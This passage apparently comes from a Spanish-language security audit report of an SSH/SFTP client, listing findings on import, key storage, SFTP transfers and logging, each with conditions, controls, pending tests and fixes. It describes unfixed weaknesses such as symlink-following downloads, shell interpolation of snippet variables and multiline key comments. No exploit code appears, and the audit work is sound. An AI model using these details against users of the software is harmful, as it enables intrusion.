+Include limita profundidad pero no archivos visitados ni expansiones repetidas; los glob ** y el abanico de includes multiplican trabajo. Las lecturas de known_hosts de conexión no usan el lector de archivos acotado del importador.
+
+- **Condiciones e impacto:** Configuración ajena con includes expansivos o rutas especiales. Bloqueo o consumo de recursos al importar o preparar una conexión.
+- **Controles y límites:** Una profundidad máxima evita recursión infinita simple. El ssh_config propio pertenece al ámbito confiable; el archivo ajeno importado sigue siendo una entrada admitida.
+- **Pendiente de prueba/contexto:** No se han medido tiempos ni bloqueado la interfaz en esta revisión.
+- **Siguiente paso:** Limitar bytes y archivos totales, deduplicar includes y rechazar archivos especiales en todas las lecturas de configuración/confianza.
+- **Evidencia en main:** [core/crates/openward-import/src/ssh_config.rs:440-449](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/ssh_config.rs#L440-L449); [core/crates/openward-import/src/ssh_config.rs:716-729](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/ssh_config.rs#L716-L729); [core/crates/openward-app/src/connect.rs:168-175](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/connect.rs#L168-L175).
+
+#### IM-7 · Termius detectado automáticamente y acceso al llavero
+
+**Necesita revisión · Pendiente de consentimiento** · **Prioridad R15**. Gravedad original: Informativa.
+
+El aviso explícito de Termius depende del programa elegido; la autodetección puede reconocerlo y pasar a leer su llavero antes de ese aviso específico.
+
+- **Condiciones e impacto:** Autodetección de datos Termius; Acceso al llavero disponible. Lectura de material de descifrado sin el aviso específico esperado.
+- **Controles y límites:** El usuario ya ha pedido importar una ruta, y el sistema puede añadir un diálogo de acceso al llavero.
+- **Pendiente de prueba/contexto:** Falta precisar si ese consentimiento general basta y comprobar la interacción nativa de cada plataforma.
+- **Siguiente paso:** Aplicar el consentimiento tras detectar el formato y antes de acceder al llavero, si se exige autorización específica.
+- **Evidencia en main:** [app/lib/import/programs.dart:38-51](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/import/programs.dart#L38-L51); [core/crates/openward-import/src/detect.rs:135-146](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/detect.rs#L135-L146).
+
+### Datos y claves
+
+#### DA-1 · La carpeta de datos es privada por defecto, con fallos de chmod ignorados
+
+**Necesita revisión · Mitigación parcial** · **Prioridad R2**. Gravedad original: Media.
+
+create_private_dir crea el directorio con 0700 y trata de endurecer uno existente, pero ignora el error de set_permissions. Algunos JSON se crean con permisos ordinarios dentro de esa carpeta.
+
+- **Condiciones e impacto:** Directorio de datos existente o personalizado; Permisos amplios y endurecimiento fallido. Posible lectura entre usuarios de historial, ajustes y metadatos.
+- **Controles y límites:** La afirmación de que el directorio normal siempre sale en 0755 ha quedado obsoleta. Un directorio 0700 propio protege también esos JSON 0644.
+- **Pendiente de prueba/contexto:** Falta validar rutas compartidas/personalizadas, propietario ajeno y fallos de permisos; no está demostrado que un usuario estándar pueda leer el directorio normal.
+- **Siguiente paso:** Fallar o advertir si no se puede garantizar la privacidad del directorio y comprobar su propiedad; verificar también instalaciones existentes.
+- **Evidencia en main:** [core/crates/openward-app/src/lib.rs:1239-1256](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/lib.rs#L1239-L1256); [app/lib/core/json_file.dart:28-32](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/core/json_file.dart#L28-L32).
+
+#### DA-2 · Backup de migración: ruta latente que debe endurecerse
+
+**No accionable en el alcance actual · Requisito antes de D3**. Gravedad original: Baja hoy (`STEPS` está vacío); Media con la primera migración real (D3).
+
+La copia VACUUM INTO no aplica permisos ni política de eliminación específicos.
+
+- **Condiciones e impacto:** Una futura migración activa la ruta de backup. Riesgo futuro de conservar una copia clara con protección insuficiente.
+- **Controles y límites:** STEPS está vacío y el formato distribuido no alcanza hoy una migración que ejecute esa copia; el directorio de datos propio es 0700. No es una fuga activa demostrada en esta versión.
+- **Pendiente de prueba/contexto:** Se debe volver a evaluar al añadir la primera migración real y el cifrado D3.
+- **Siguiente paso:** Antes de D3, crear backups 0600, establecer retención y eliminar copias/WAL claros tras migrar; no dar este requisito por implementado.
+- **Evidencia en main:** [core/crates/openward-vault/src/store.rs:18-18](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-vault/src/store.rs#L18); [core/crates/openward-vault/src/store.rs:73-83](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-vault/src/store.rs#L73-L83); [core/crates/openward-vault/src/store.rs:124-133](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-vault/src/store.rs#L124-L133).
+
+#### DA-3 · Una clave pública con comentario multilínea instala líneas adicionales
+
+**Confirmado · Vigente** · **Prioridad C6**. Gravedad original: Baja.
+
+public_line conserva el comentario aceptado por ssh-key y with_authorized añade la cadena completa. El parser y serializador fijados de ssh-key permiten saltos internos en ese comentario.
+
+- **Condiciones e impacto:** Clave pública o comentario suministrado por un tercero; El usuario instala esa clave. Instalación de una segunda clave de acceso no revisada.
+- **Controles y límites:** El transporte SFTP evita una inyección de shell, pero no limita la operación a una única clave autorizada.
+- **Pendiente de prueba/contexto:** No se ha repetido la instalación de la PoC histórica.
+- **Siguiente paso:** Exigir exactamente una clave pública y una sola línea en el límite install_public_key; sanear controles en comentarios al importar y escribir claves.
+- **Evidencia en main:** [core/crates/openward-app/src/keychain.rs:553-592](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/keychain.rs#L553-L592); [core/crates/openward-app/src/sftp.rs:149-164](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/sftp.rs#L149-L164).
+
+#### DA-4 · Variables automáticas de snippets sustituidas como texto de shell
+
+**Confirmado · Vigente** · **Prioridad C7**. Gravedad original: Baja.
+
+Nombre, dirección y usuario del host se insertan literalmente en el comando; también pueden proceder de datos importados. El arranque de snippets reutiliza esa sustitución.
+
+- **Condiciones e impacto:** Host o etiqueta importados; Snippet que interpola ese valor; Ejecución posterior. Órdenes adicionales por interpretación de datos como sintaxis de shell.
+- **Controles y límites:** Los valores escritos por el operador son configuración confiable y existen confirmaciones para ciertas ejecuciones, pero una ejecución simple no revisa necesariamente el comando final.
+- **Pendiente de prueba/contexto:** No se ha ejecutado un payload; el tratamiento correcto depende además del contexto sintáctico del shell.
+- **Siguiente paso:** Mostrar el comando renderizado y diseñar sustitución tipada/escapado según contexto; no aplicar una comilla genérica que rompa otros contextos.
+- **Evidencia en main:** [core/crates/openward-app/src/snippets.rs:84-99](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/snippets.rs#L84-L99); [app/lib/snippets/snippets.dart:55-104](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/snippets/snippets.dart#L55-L104).
+
+#### DA-5 · Cobertura incompleta del borrado de secretos en memoria
+
+**No accionable en el alcance actual · Endurecimiento D6 pendiente**. Gravedad original: Baja.
+
+Persisten Strings y buffers de claves/descifrado sin Zeroizing en parte del recorrido FFI e importador.
+
+- **Condiciones e impacto:** Acceso a memoria del proceso o futura ampliación del modelo. Permanencia de material sensible en memoria más tiempo del necesario.
+- **Controles y límites:** El modelo excluye malware y programas del mismo UID que inspeccionan memoria. Otras rutas sí usan Zeroizing; no se identifica aquí una lectura de memoria por un actor admitido.
+- **Pendiente de prueba/contexto:** No hay evidencia de un canal adicional de exposición. No se considera corregido.
+- **Siguiente paso:** Conservar AM4/D6: inventariar copias y poner a cero buffers cuando se implemente el manejo completo de secretos.
+- **Evidencia en main:** [core/crates/openward-ffi/src/api/keychain.rs:141-193](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ffi/src/api/keychain.rs#L141-L193); [core/crates/openward-import/src/termius/crypto.rs:1-79](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-import/src/termius/crypto.rs#L1-L79).
+
+#### DA-6 · Exportación de claves sin garantía comprobada de permisos finales
+
+**Necesita revisión · Pendiente de plataforma** · **Prioridad R5**. Gravedad original: Baja.
+
+El flujo copia el archivo y después solicita chmod 600 sin comprobar su resultado; en Windows no aplica esa operación.
+
+- **Condiciones e impacto:** Exportación a un destino cuya protección no está garantizada. Posible archivo de clave más accesible de lo esperado.
+- **Controles y límites:** El resultado de File.copy depende de permisos del origen, destino, sistema de archivos y ACL. El usuario elige dónde exportar.
+- **Pendiente de prueba/contexto:** Faltan pruebas de modo/ACL resultantes y tratamiento del fallo en macOS, Linux y Windows.
+- **Siguiente paso:** Crear el destino de forma privada desde el inicio y comprobar permisos/ACL y errores antes de anunciar éxito.
+- **Evidencia en main:** [app/lib/keys/key_actions.dart:40-50](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/keys/key_actions.dart#L40-L50).
+
+#### DA-7 · Certificados leídos sin límite desde una llamada síncrona de la interfaz
+
+**Confirmado · Vigente; impacto de disponibilidad** · **Prioridad C22**. Gravedad original: Informativa.
+
+key_info usa Certificate::read_file sobre rutas configurables sin verificar archivo normal ni tamaño. identities y key_info están expuestas con frb(sync).
+
+- **Condiciones e impacto:** Configuración ajena con CertificateFile hacia un archivo especial o enorme; Consulta de identidades. Bloqueo o agotamiento de recursos de la interfaz.
+- **Controles y límites:** Las lecturas de clave de otras rutas sí están acotadas; ese control no cubre la lectura del certificado. No se afirma ejecución de código.
+- **Pendiente de prueba/contexto:** No se ha abierto un FIFO ni medido un bloqueo; el recorrido síncrono y la lectura sin cota son estáticos.
+- **Siguiente paso:** Usar el lector acotado de archivos normales también para certificados y sacar la E/S del recorrido síncrono de la interfaz.
+- **Evidencia en main:** [core/crates/openward-app/src/keys.rs:82-90](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/keys.rs#L82-L90); [core/crates/openward-ffi/src/api/identities.rs:242-248](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ffi/src/api/identities.rs#L242-L248); [core/crates/openward-ffi/src/api/identities.rs:280-284](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-ffi/src/api/identities.rs#L280-L284).
+
+#### DA-8 · Alcance de la advertencia sobre datos claros
+
+**No accionable en el alcance actual · Documentado**. Gravedad original: Informativa.
+
+SECURITY.md enlaza al modelo, que enumera vault, historial, recientes, ajustes y registros todavía claros, con sus permisos.
+
+- **Condiciones e impacto:** Uso actual de la beta sin cifrado completo. Límite de confidencialidad documentado; no una omisión vigente demostrada.
+- **Controles y límites:** La frase breve sobre el vault no sustituye ese inventario. Los snippets/notas pueden contener texto sensible elegido por el usuario.
+- **Pendiente de prueba/contexto:** No se ha vuelto a buscar secretos en el historial completo del repositorio.
+- **Siguiente paso:** Mantener sincronizados ambos documentos conforme avance el cifrado y conservar advertencias sobre los datos claros de la beta.
+- **Evidencia en main:** [SECURITY.md:1-23](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/SECURITY.md#L1-L23); [docs/THREAT_MODEL.md:1-140](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/docs/THREAT_MODEL.md#L1-L140).
+
+#### DA-9 · Nombres literales de claves que contienen %
+
+**No accionable en el alcance actual · Deuda de corrección**. Gravedad original: Informativa.
+
+Los nombres enumerados y su posterior paso por expansión de tokens pueden discrepar cuando el nombre contiene %. Puede seleccionarse otro archivo del área de claves.
+
+- **Condiciones e impacto:** Archivos con nombres especiales dentro de ~/.ssh. Acción sobre un archivo distinto del mostrado en un escenario local condicionado.
+- **Controles y límites:** Las operaciones destructivas están limitadas a ~/.ssh y el escenario original exige que otro proceso del mismo UID prepare esos archivos, actor excluido.
+- **Pendiente de prueba/contexto:** No se demuestra un cruce de privilegios con entradas admitidas.
+- **Siguiente paso:** Separar rutas ya resueltas de expresiones con tokens para evitar operar sobre una clave distinta; no presentarlo como una vulnerabilidad corregida.
+- **Evidencia en main:** [core/crates/openward-app/src/keychain.rs:206-236](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/keychain.rs#L206-L236); [core/crates/openward-app/src/local.rs:60-86](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/local.rs#L60-L86).
+
+### SFTP y terminal local
+
+#### SF-1 · Descargas que siguen enlaces locales en directorios y archivos .part
+
+**Confirmado · Vigente** · **Prioridad C2**. Gravedad original: Media.
+
+La comprobación de directorios sigue symlinks y la apertura del temporal no usa una defensa equivalente a NOFOLLOW/EXCL. Un .part existente se abre para escritura y ajuste de tamaño.
+
+- **Condiciones e impacto:** Destino local o ancestro modificable por otro usuario; Enlace preparado antes o durante la descarga. Sobrescritura de archivos del usuario fuera del destino autorizado.
+- **Controles y límites:** El nombre propio del temporal limita colisiones accidentales, pero no autentica su propietario. La seguridad de nombres remotos no impide seguir enlaces ya presentes localmente.
+- **Pendiente de prueba/contexto:** Requiere un destino compartido modificable por otro usuario; las protecciones de symlinks varían entre sistemas. No se ha repetido la PoC.
+- **Siguiente paso:** Anclar operaciones al directorio de destino y abrir sin seguir enlaces, verificar propietario/tipo y usar temporales creados exclusivamente.
+- **Evidencia en main:** [core/crates/openward-sftp/src/local.rs:37-48](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/local.rs#L37-L48); [core/crates/openward-sftp/src/transfer.rs:1066-1075](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/transfer.rs#L1066-L1075); [core/crates/openward-sftp/src/transfer.rs:1134-1155](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/transfer.rs#L1134-L1155).
+
+#### SF-2 · La descarga de un enlace usa permisos del enlace en lugar del destino
+
+**Confirmado · Vigente** · **Prioridad C14**. Gravedad original: Baja.
+
+follow_links actualiza tipo y tamaño, pero no modo/fecha. La transferencia conserva ese modo y lo aplica al archivo local del destino del enlace.
+
+- **Condiciones e impacto:** Descarga de un enlace remoto a un archivo con permisos restrictivos. Archivo local con lectura o ejecución más amplia que el origen efectivo.
+- **Controles y límites:** Las rutas de descarga directa de un archivo normal no pasan por esta discrepancia.
+- **Pendiente de prueba/contexto:** No se han descargado archivos en esta revisión.
+- **Siguiente paso:** Recoger los atributos efectivos del destino al seguir un enlace y aplicar una política de permisos locales que no amplíe acceso.
+- **Evidencia en main:** [core/crates/openward-sftp/src/remote.rs:150-187](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/remote.rs#L150-L187); [core/crates/openward-sftp/src/transfer.rs:841-846](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/transfer.rs#L841-L846); [core/crates/openward-sftp/src/transfer.rs:1187-1197](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/transfer.rs#L1187-L1197).
+
+#### SF-3 · Permisos de directorios no conservados en transferencias
+
+**Confirmado · Vigente** · **Prioridad C15**. Gravedad original: Baja.
+
+Los directorios nuevos se crean con los valores por defecto del destino, sin reproducir el modo restrictivo de la carpeta origen.
+
+- **Condiciones e impacto:** Transferencia de un directorio restrictivo con archivos de modo más amplio. Pérdida de la restricción de acceso que imponía la carpeta.
+- **Controles y límites:** Los permisos de cada archivo y la umask del destino pueden reducir el impacto, pero no preservan la barrera de un directorio 0700 con archivos legibles.
+- **Pendiente de prueba/contexto:** No se ha comprobado una umask específica de plataforma.
+- **Siguiente paso:** Crear directorios restrictivos y aplicar sus permisos finales al terminar, en ambas direcciones.
+- **Evidencia en main:** [core/crates/openward-sftp/src/transfer.rs:949-949](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/transfer.rs#L949); [core/crates/openward-sftp/src/transfer.rs:1066-1075](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/transfer.rs#L1066-L1075).
+
+#### SF-4 · Conservación de bits especiales durante la subida
+
+**Necesita revisión · Pendiente del servidor** · **Prioridad R9**. Gravedad original: Baja.
+
+Los atributos enviados conservan bits de modo hasta 07777, incluidos setuid, setgid y sticky.
+
+- **Condiciones e impacto:** Origen con bits especiales; Servidor que permite conservarlos con efectos relevantes. Posible efecto de permisos no deseado en el destino.
+- **Controles y límites:** La asignación de propietario y la preservación efectiva de esos bits dependen del servidor, del sistema de archivos y de los permisos de la cuenta.
+- **Pendiente de prueba/contexto:** Enviar el bit no prueba por sí solo una elevación de privilegios. Falta un escenario con privilegios separados.
+- **Siguiente paso:** Definir una política explícita de bits especiales y limpiarlos por defecto salvo preservación consentida.
+- **Evidencia en main:** [core/crates/openward-sftp/src/remote.rs:365-380](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/remote.rs#L365-L380).
+
+#### SF-5 · Subida recursiva de enlaces a archivos fuera del origen
+
+**Confirmado · Vigente** · **Prioridad C4**. Gravedad original: Baja.
+
+El recorrido local y la apertura de archivos siguen enlaces a archivos aunque el destino resuelto quede fuera de la carpeta seleccionada.
+
+- **Condiciones e impacto:** Carpeta ajena extraída o recibida con symlinks; Subida recursiva al servidor. Envío de archivos privados situados fuera de la selección.
+- **Controles y límites:** No se siguen del mismo modo todos los enlaces a carpetas. La selección de una carpeta no muestra cada destino de enlace a archivo.
+- **Pendiente de prueba/contexto:** No se ha exfiltrado ningún archivo de prueba.
+- **Siguiente paso:** No seguir enlaces por defecto en subidas recursivas o pedir autorización con destino resuelto; imponer confinamiento al origen seleccionado.
+- **Evidencia en main:** [core/crates/openward-sftp/src/local.rs:116-136](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/local.rs#L116-L136); [core/crates/openward-sftp/src/transfer.rs:1000-1025](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/transfer.rs#L1000-L1025).
+
+#### SF-6 · Nombres Unix ambiguos al subir a un servidor Windows
+
+**Necesita revisión · Pendiente de plataforma** · **Prioridad R7**. Gravedad original: Baja.
+
+Un cliente Unix puede aportar nombres con barra inversa o dos puntos que una implementación SFTP de Windows interprete de forma especial.
+
+- **Condiciones e impacto:** Cliente Unix; Servidor Windows con interpretación especial de esos nombres. Posible destino distinto del nombre mostrado.
+- **Controles y límites:** Las comprobaciones locales de Windows no describen necesariamente la semántica del servidor remoto; no todos los servidores normalizan igual.
+- **Pendiente de prueba/contexto:** Falta validar servidores Windows concretos y si permiten separadores alternativos o ADS en esa ruta.
+- **Siguiente paso:** Validar según la semántica del destino y rechazar nombres ambiguos antes de transferir.
+- **Evidencia en main:** [core/crates/openward-sftp/src/transfer.rs:827-837](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/transfer.rs#L827-L837).
+
+#### SF-7 · Nombres reservados de Windows en descargas
+
+**Necesita revisión · Pendiente de plataforma** · **Prioridad R8**. Gravedad original: Baja.
+
+local_join rechaza separadores y dos puntos, pero no expresa un control para CON/NUL y nombres terminados en punto o espacio.
+
+- **Condiciones e impacto:** Descarga en Windows; Nombre remoto reservado o ambiguo. Colisión, fallo o acceso a un destino inesperado condicionado por plataforma.
+- **Controles y límites:** El comportamiento real también depende de las rutas verbatim usadas por Rust y del sistema de archivos.
+- **Pendiente de prueba/contexto:** No se ha validado la creación/apertura nativa en Windows; no se afirma escritura a dispositivos como resultado probado.
+- **Siguiente paso:** Verificar las APIs reales y rechazar los nombres que no tengan una representación inequívoca en el destino.
+- **Evidencia en main:** [core/crates/openward-sftp/src/transfer.rs:827-837](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/transfer.rs#L827-L837).
+
+#### SF-8 · La descarga ordinaria no marca el origen del archivo
+
+**Necesita revisión · Mitigación parcial** · **Prioridad R4**. Gravedad original: Baja.
+
+La descarga ordinaria sigue aplicando el modo sin una marca explícita de origen o una retirada general del bit ejecutable.
+
+- **Condiciones e impacto:** Archivo remoto descargado; Apertura posterior mediante aplicaciones del sistema. Posible menor advertencia de procedencia al abrir contenido remoto.
+- **Controles y límites:** El flujo de Abrir/edición remota incorpora controles de cuarentena, ejecutables y nombres invisibles. Ese arreglo no equivale a marcar toda descarga.
+- **Pendiente de prueba/contexto:** Falta comprobar el efecto real de Gatekeeper/SmartScreen y de cada sistema de archivos. No se declara un bypass general validado.
+- **Siguiente paso:** Definir y comprobar la política de origen de las descargas ordinarias y armonizarla con el flujo Abrir.
+- **Evidencia en main:** [core/crates/openward-sftp/src/transfer.rs:1187-1197](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/transfer.rs#L1187-L1197); [app/lib/sftp/open_safety.dart:1-120](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/sftp/open_safety.dart#L1-L120).
+
+#### SF-9 · El diálogo de permisos pierde bits especiales y usa el modo de un enlace
+
+**Confirmado · Vigente** · **Prioridad C16**. Gravedad original: Baja.
+
+El diálogo recorta el modo a 0777; un enlace puede presentarse como 0777 mientras setstat actúa sobre su destino. La operación puede retirar sticky/setgid o ampliar permisos del destino.
+
+- **Condiciones e impacto:** Cambio de permisos de una carpeta con bits especiales o de un symlink. Permisos del objeto efectivo diferentes de lo mostrado o esperado.
+- **Controles y límites:** El usuario confirma un cambio de permisos, pero la pantalla no conserva ni representa todos los bits/objeto sobre los que opera.
+- **Pendiente de prueba/contexto:** No se ha cambiado ningún permiso remoto durante la revisión.
+- **Siguiente paso:** Preservar o mostrar los bits especiales y resolver explícitamente el objeto efectivo antes de editar permisos de un enlace.
+- **Evidencia en main:** [app/lib/sftp/dialogs.dart:357-389](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/sftp/dialogs.dart#L357-L389); [core/crates/openward-sftp/src/remote.rs:328-380](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/remote.rs#L328-L380).
+
+#### SF-10 · Operaciones recursivas y sustitución de enlaces entre comprobación y uso
+
+**Necesita revisión · Carrera pendiente de validación** · **Prioridad R6**. Gravedad original: Baja.
+
+El borrado/chmod recursivo comprueba el tipo antes de abrir o recorrer el nombre; entre ambas operaciones otro usuario del servidor puede sustituirlo.
+
+- **Condiciones e impacto:** Árbol remoto compartido; Otro usuario sustituye una entrada durante la recursión. Posible operación fuera del subárbol aprobado.
+- **Controles y límites:** La aplicación evita seguir enlaces observados durante la comprobación. El efecto final de la carrera depende de la implementación SFTP y sus permisos.
+- **Pendiente de prueba/contexto:** Falta una reproducción con servidor y árbol compartido concretos; no se ha probado borrado fuera del origen.
+- **Siguiente paso:** Preferir operaciones ancladas a handles/directorios y definir cómo abortar ante cambios; validar una carrera antes de asignar impacto definitivo.
+- **Evidencia en main:** [core/crates/openward-sftp/src/remote.rs:309-360](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/remote.rs#L309-L360).
+
+#### SF-11 · Límites frente a un servidor SFTP que agota recursos
+
+**No accionable en el alcance actual · Disponibilidad fuera del modelo actual**. Gravedad original: Baja (la app se cae).
+
+Persisten presupuestos incompletos de listados y recorrido. La descarga sí programa peticiones hasta end: se retira la afirmación absoluta de que ignora el tamaño anunciado.
+
+- **Condiciones e impacto:** Servidor SFTP hostil. Agotamiento de recursos, excluido del alcance de seguridad acordado.
+- **Controles y límites:** El modelo excluye expresamente que el servidor hostil deniegue servicio o llene disco. No se atribuye aquí una nueva lectura/escritura fuera de autorización.
+- **Pendiente de prueba/contexto:** No se repiten cifras de consumo de la prueba original ni se afirma protección total.
+- **Siguiente paso:** Mantener como robustez límites de entradas, profundidad, bytes y respuestas; volver a priorizar si se amplía el modelo de disponibilidad.
+- **Evidencia en main:** [core/crates/openward-sftp/src/pipe.rs:110-166](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/pipe.rs#L110-L166); [core/crates/openward-sftp/src/remote.rs:110-149](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/remote.rs#L110-L149).
+
+#### SF-12 · Otras observaciones de SFTP y terminal local
+
+**No accionable en el alcance actual · Límites y robustez documentables**. Gravedad original: Informativa.
+
+Se conservan tres observaciones: escritura intencional a través de enlaces remotos, sustitución del enlace authorized_keys al instalar una clave y asignaciones en pre_exec de portable-pty.
+
+- **Condiciones e impacto:** Configuración local o enlaces remotos gestionados por el operador. Diferencias de semántica y posibles problemas de robustez.
+- **Controles y límites:** La primera es una decisión de comportamiento; la segunda escribe el archivo administrado; la tercera es un riesgo de bloqueo sin un cruce de confianza demostrado en este caso.
+- **Pendiente de prueba/contexto:** No se ha demostrado un acceso adicional de un actor del modelo ni un bloqueo reproducible.
+- **Siguiente paso:** Documentar la semántica de enlaces y estudiar la robustez de pre_exec separadamente, sin presentarlos como fallos explotables confirmados.
+- **Evidencia en main:** [core/crates/openward-app/src/sftp.rs:149-164](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/sftp.rs#L149-L164); [core/crates/openward-sftp/src/remote.rs:328-380](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-sftp/src/remote.rs#L328-L380).
+
+### Registros e historial
+
+#### RG-1 · El espacio inicial no excluye del historial una línea editada
+
+**Confirmado · Vigente** · **Prioridad C17**. Gravedad original: Baja.
+
+El camino sin edición comprueba el espacio inicial, pero el editado obtiene el texto reconstruido y lo recorta, perdiendo ese indicador de exclusión.
+
+- **Condiciones e impacto:** Comando con espacio inicial; Edición de la línea antes de enviarla. Persistencia de un comando que el usuario pretendía excluir.
+- **Controles y límites:** No se guardan teclas de contraseña por esta vía y el caso sin edición sí aplica la regla.
+- **Pendiente de prueba/contexto:** No se han escrito comandos de prueba; AM7 continúa en D6.
+- **Siguiente paso:** Conservar el indicador de no registrar antes de cualquier trim/reconstrucción y aplicarlo a historial y marcadores del registro.
+- **Evidencia en main:** [app/lib/history/line_tracker.dart:125-165](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/history/line_tracker.dart#L125-L165).
+
+#### RG-2 · Alcance temporal de la pausa de grabación
+
+**Necesita revisión · Casos límite pendientes** · **Prioridad R12**. Gravedad original: Baja.
+
+La salida comprueba paused y los marcadores comprueban el estado al emitirse; una línea empezada durante la pausa puede finalizar después. Redibujos y reconexiones necesitan un contrato explícito.
+
+- **Condiciones e impacto:** Pausa durante la composición de una línea o reconexión/redibujo posterior. Posible persistencia posterior de texto asociado al intervalo pausado.
+- **Controles y límites:** La pausa sí bloquea la salida mientras está activa. No equivale a borrar texto que el servidor vuelva a mostrar tras reanudar.
+- **Pendiente de prueba/contexto:** Falta validar el seguimiento de líneas y estado al pausar/reanudar/reconectar; no se afirma que toda pausa falle.
+- **Siguiente paso:** Definir la expectativa y descartar el seguimiento iniciado durante la pausa si el contrato requiere excluirlo por completo.
+- **Evidencia en main:** [core/crates/openward-app/src/logs/recorder.rs:119-124](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/recorder.rs#L119-L124); [core/crates/openward-app/src/logs/recorder.rs:168-175](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/core/crates/openward-app/src/logs/recorder.rs#L168-L175); [app/lib/history/line_tracker.dart:125-165](https://github.com/KaiCorpLabs/openward/blob/35ab7a63187a58aae132a31bd000ab0858164dff/app/lib/history/line_tracker.dart#L125-L165).
+
+#### RG-3 · La cuota poda registros no guardados
+
+**No accionable en el alcance actual · Retención intencionada; DOS excluido**. Gravedad original: Baja.
+
+La retención por cuota elimina entradas antiguas no guardadas cuando se llena el espacio asignado.
+
+- **Condiciones e impacto:** Servidor produce mucha salida; Cuota de retención alcanzada. Pérdida prevista de registros no guardados por la política de retención.
+- **Controles y límites:** La poda excluye registros guardados y sesiones abiertas. No se sostiene que un servidor pueda borrar los guardados. El producto no promete un archivo forense inmutable y excluye DOS del servidor.
+- **Pendiente de prueba/contexto:** No se han llenado cuotas durante esta revisión.
